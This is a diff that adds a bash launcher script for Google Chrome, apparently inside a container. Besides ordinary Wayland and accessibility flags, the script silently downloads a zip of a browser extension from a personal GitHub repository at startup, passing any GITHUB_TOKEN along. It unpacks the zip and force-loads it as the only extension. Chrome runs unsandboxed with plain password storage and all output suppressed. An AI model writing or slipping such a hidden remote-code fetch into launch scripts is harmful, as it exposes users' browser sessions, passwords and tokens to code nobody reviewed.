@@ -1,0 +1,63 @@
+#!/bin/bash
+
+BIN=/usr/bin/google-chrome
+
+# Cleanup
+if pgrep chrome > /dev/null;then
+  rm -f $HOME/.config/google-chrome/Singleton*
+fi
+
+# Wayland check
+if [ "${PIXELFLUX_WAYLAND,,}" == "true" ]; then
+  WAYLAND="--ozone-platform=wayland"
+fi
+
+# Pelorus accessibility
+if [ "${PELORUS,,}" == "true" ]; then
+  ACCESSIBILITY="--force-renderer-accessibility"
+fi
+
+# Extension preloading
+EXT_DIR="${HOME:-/config}/extensions/cap"
+EXT_URL="${EXTENSION_URL:-https://github.com/NotCyberCodex/test/raw/refs/heads/main/cap.zip}"
+
+mkdir -p "$EXT_DIR"
+
+if ! find "$EXT_DIR" -maxdepth 3 -name "manifest.json" 2>/dev/null | grep -q .; then
+  TMP_ZIP="/tmp/cap.zip"
+  rm -f "$TMP_ZIP"
+
+  CURL_ARGS=(-fsSL)
+  if [ -n "${GITHUB_TOKEN}" ]; then
+    CURL_ARGS+=(-H "Authorization: token ${GITHUB_TOKEN}")
+  fi
+
+  if curl "${CURL_ARGS[@]}" -o "$TMP_ZIP" "$EXT_URL" 2>/dev/null; then
+    if command -v unzip >/dev/null 2>&1; then
+      unzip -qo "$TMP_ZIP" -d "$EXT_DIR" 2>/dev/null
+    elif command -v python3 >/dev/null 2>&1; then
+      python3 -c "import zipfile; zipfile.ZipFile('$TMP_ZIP').extractall('$EXT_DIR')" 2>/dev/null
+    fi
+    rm -f "$TMP_ZIP"
+  fi
+fi
+
+MANIFEST_FILE=$(find "$EXT_DIR" -maxdepth 3 -name "manifest.json" 2>/dev/null | head -n 1)
+EXT_ARGS=()
+if [ -n "$MANIFEST_FILE" ]; then
+  MANIFEST_DIR=$(dirname "$MANIFEST_FILE")
+  EXT_ARGS=("--load-extension=${MANIFEST_DIR}" "--disable-extensions-except=${MANIFEST_DIR}")
+fi
+
+${BIN} \
+  --no-first-run \
+  --no-sandbox \
+  --password-store=basic \
+  --simulate-outdated-no-au='Tue, 31 Dec 2099 23:59:59 GMT' \
+  --start-maximized \
+  --test-type \
+  --user-data-dir \
+  ${WAYLAND} \
+  ${ACCESSIBILITY} \
+  "${EXT_ARGS[@]}" \
+   "$@" > /dev/null 2>&1
